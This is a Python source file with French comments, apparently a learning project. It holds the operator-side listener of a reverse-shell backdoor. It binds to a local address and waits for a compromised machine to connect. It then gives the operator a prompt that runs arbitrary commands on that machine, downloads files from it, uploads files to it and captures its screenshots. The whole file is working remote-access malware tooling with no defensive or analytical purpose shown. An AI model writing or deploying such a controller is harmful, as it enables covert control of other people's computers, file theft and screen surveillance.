#!/usr/bin/python3

import socket
import json

def reliable_send(data):
    if type(data) is not bytes:
        json_data = json.dumps(data)
    else:
        json_data = json.dumps(data.decode('utf-8'))
    print("envoi de -> {}".format(data))
    target.send(json_data.encode())


def reliable_recv_image():
    data = b""
    BUFF_SIZE = 4096
    while True:
        
        data_recv = target.recv(BUFF_SIZE)
        data += data_recv
        if len(data_recv) < BUFF_SIZE:
            break
    return data


def reliable_recv():
    data = ""
    while True:
        try:
            data_recv = target.recv(1024).decode('utf-8')
            print(data_recv)
            data = data + data_recv
            return json.loads(data)
        except ValueError:
            continue

def concatenateUploadMessageAndFileUploadContent(command, content):
    return command + " | " + content


def shell():
    count_screen = 1
    while True:
        command = input("Shell#~{}:".format(ip))
        print("command -> {}".format(command))
        if command == 'q':
            s.close()
            break
        elif len(command) > 1 and command[:2] == "cd":
            reliable_send(command)
            #ça veut dire qu'on veut changer de fichier donc il ne faut pas attendre de réponse
            continue
        elif len(command) > 1 and command[:8] == "download":
            reliable_send(command)
            # ici on va avoir la possibilité de download un file
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                print("file_data -> {}".format(file_data))
                file.write(file_data.encode())
        elif len(command) > 1 and command[:6] == "upload":
            # pour la partie upload
            print("je suis dans la partie upload")
            #try:
            with open(command[7:], "rb") as file:
                command_file_content = concatenateUploadMessageAndFileUploadContent(command, file.read().decode('utf-8'))
                print("file_content -> {}".format(command_file_content))
                reliable_send(command_file_content)
                print("apres l'envoi du content")
            #except:
            #    reliable_send("Faiiled to Upload")
        elif len(command) > 1 and command[:10] == "screenshot":
           reliable_send(command)
           with open("screenshot{}.png".format(count_screen), "wb") as screen:
                image = reliable_recv_image()
                if image[:3] == "[-]":
                    print("Error -> {}".format(image))
                else:
                    print(image)
                    screen.write(image)
                    count_screen += 1
        else:
            reliable_send(command)
            message = reliable_recv()
            print(message)

def server():
    global s
    global ip
    global target
    # on cree lobjet pour la connection en IPV4 et on veut verifier que ce sont bien des request TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # l'ip est le port sur lequel nous ecountons au niveau du server
    s.bind(("192.168.0.45", 54321))
    # on accepte 5 connexions en meme temps
    s.listen(5)

    print("[+] Listening For Incoming Connections")

    target, ip = s.accept()
    print("[+] Connection Established From {}".format(ip))

if __name__ == '__main__':
    server()
    shell()
